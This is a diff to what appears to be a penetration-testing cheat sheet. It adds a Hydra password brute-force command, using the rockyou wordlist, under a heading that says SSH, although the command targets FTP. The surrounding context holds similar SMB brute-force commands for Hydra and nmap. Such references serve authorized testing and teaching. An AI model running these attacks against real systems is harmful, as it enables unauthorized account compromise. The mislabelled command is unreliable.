@@ -158,6 +158,13 @@ hydra -v -t1 -l Administrator -P /usr/share/wordlists/rockyou.txt -f {{< param "
 sudo nmap --script smb-brute -p U:137,T:139 {{< param "war.rhost" >}}
 ```
 
+### SSH
+
+#### Hydra [^hydra]
+```sh
+hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt -f 10.0.0.3 ftp
+```
+
 ## Web Applications
 
 ### HTTP Basic Auth
